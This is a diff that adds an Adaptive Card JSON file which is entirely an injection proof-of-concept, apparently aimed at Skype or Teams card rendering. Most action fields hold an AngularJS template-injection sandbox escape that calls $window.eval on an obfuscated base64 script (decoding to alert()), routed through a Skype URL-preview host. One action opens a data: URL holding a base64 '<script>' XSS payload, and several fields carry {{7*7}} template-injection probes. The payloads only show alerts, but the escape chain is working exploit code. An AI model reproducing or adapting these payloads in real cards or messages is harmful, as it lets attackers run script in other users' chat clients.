@@ -1,0 +1,51 @@
+{
+  "$schema": "https://adaptivecards.io/schemas/adaptive-card.json",
+  "type": "AdaptiveCard",
+  "version": "1.2",
+  "body": [],
+  "actions": [
+    {
+      "type": "Action.OpenUrl",
+      "url": "https://urlp.asm.skype.com/v1/url/content?aaa=xxx{{[\\27if(!window.__x__){eval(atob(decodeURIComponent(/YWxlcnQoKQ/.source))),window.__x__=1}\\27].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}}",
+      "title": "{{7*7}}",
+      "iconUrl": "https://urlp.asm.skype.com/v1/url/content?aaa=xxx{{[\\27if(!window.__x__){eval(atob(decodeURIComponent(/YWxlcnQoKQ/.source))),window.__x__=1}\\27].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}}",
+      "style": "destructive"
+    },
+    {
+      "type": "Action.OpenUrl",
+      "url": "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K",
+      "title": "open url xss link",
+      "iconUrl": "https://urlp.asm.skype.com/v1/url/content?aaa=xxx{{[\\27if(!window.__x__){eval(atob(decodeURIComponent(/YWxlcnQoKQ/.source))),window.__x__=1}\\27].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}}",
+      "style": "destructive"
+    },
+    {
+      "type": "Action.Submit",
+      "data": { "key": "value" },
+      "title": "{{7*7}}",
+      "iconUrl": "https://urlp.asm.skype.com/v1/url/content?aaa=xxx{{[\\27if(!window.__x__){eval(atob(decodeURIComponent(/YWxlcnQoKQ/.source))),window.__x__=1}\\27].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}}",
+      "style": "destructive"
+    },
+    {
+      "type": "Action.ShowCard",
+      "title": "{{7*7}}",
+      "iconUrl": "https://urlp.asm.skype.com/v1/url/content?aaa=xxx{{[\\27if(!window.__x__){eval(atob(decodeURIComponent(/YWxlcnQoKQ/.source))),window.__x__=1}\\27].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}}",
+      "style": "destructive",
+      "card": {
+        "type": "AdaptiveCard",
+        "body": []
+      }
+    },
+    {
+      "type": "Action.ToggleVisibility",
+      "title": "{{7*7}}",
+      "iconUrl": "https://urlp.asm.skype.com/v1/url/content?aaa=xxx{{7*7}}",
+      "style": "destructive",
+      "targetElements": [
+        {
+          "elementId": "{{7*7}}",
+          "isVisible": true
+        }
+      ]
+    }
+  ]
+}
